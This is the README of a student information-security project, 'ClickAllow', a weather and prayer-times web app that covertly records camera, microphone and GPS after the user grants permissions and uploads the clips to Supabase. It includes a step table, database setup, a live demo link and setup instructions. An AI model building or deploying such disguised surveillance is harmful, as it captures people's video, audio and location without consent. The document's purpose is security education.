# ClickAllow 🔐

> A social engineering demo disguised as a weather app — silently 
captures location, camera & microphone, uploads recordings to 
Supabase cloud. Built for Information Security research.



---

## 👀 What Is This?

**ClickAllow** looks like a completely innocent weather & prayer 
times app. But the moment a user grants location, camera and 
microphone permissions — silent continuous recording begins in 
the background.

The user never suspects a thing.

---

## 🎯 How It Works

| Step | What User Sees | What Actually Happens |
|------|---------------|----------------------|
| 1 | "Allow Access & Start" button | Nothing yet |
| 2 | Location permission popup | GPS coordinates captured |
| 3 | Camera & Mic permission popup | Recording begins |
| 4 | Weather & prayer times dashboard | 5-second clips uploading to cloud |
| 5 | "Verification Active" badge | GPS metadata logged in database |

---

## 🔴 Live Demo
👉 [naveed-project-2.netlify.app](https://naveed-project-2.netlify.app/)

---

## ⚙️ Tech Stack

- **Frontend** — HTML, CSS, JavaScript (Vanilla)
- **Camera & Mic** — MediaRecorder API
- **Location** — Geolocation API
- **Weather** — Open-Meteo API (no key required)
- **Prayer Times** — Aladhan API (no key required)
- **Cloud Storage** — Supabase Storage
- **Database** — Supabase (PostgreSQL)

---

## 🗄️ Supabase Backend Setup

### 1. Storage Bucket
Create a bucket named `recordings` in Supabase Storage.

### 2. Database Table
```sql
create table public.session_logs (
    id serial primary key,
    file_path text not null,
    latitude double precision,
    longitude double precision,
    recorded_at timestamp with time zone default now()
);
```

---

## 📁 Project Structure
```
ClickAllow/
├── index.html      # UI — location permission flow, dashboard
├── style.css       # Styling — professional color scheme & layout
└── javas.js        # Logic — geolocation, APIs, recording, uploads
```

---

## 🚀 Run Locally
```bash
# 1. Clone the repository
git clone https://github.com/yourusername/ClickAllow.git

# 2. Open index.html in your browser
# No build tools or dependencies needed

# 3. Update Supabase credentials in javas.js
const supabaseUrl = 'YOUR_SUPABASE_URL';
const supabaseKey = 'YOUR_SUPABASE_KEY';
```

---

## 📸 Screenshots

### Landing Page
![Landing Page](/p.png)

### Location Permission
![Location Permission](/p2.png)

### Camera & Microphone Permission + Dashboard
![Dashboard](/p3.png)

---

## ⚠️ Disclaimer

This project was built **strictly for educational purposes** as part 
of an Information Security assignment at BSCS-6E. It demonstrates 
how browser permissions can be exploited through social engineering. 

**Do not use this for malicious purposes.**

---

## 👨‍💻 Built By

- **Taha Saleem** — 23F-0517
- **Naveed Hassan** — 23F-0599

---

## 🔐 Key Takeaway

This is why Information Security isn't just about firewalls and 
passwords — it's about understanding how **trust can be weaponized.**

Think twice before you click **Allow.** 👀
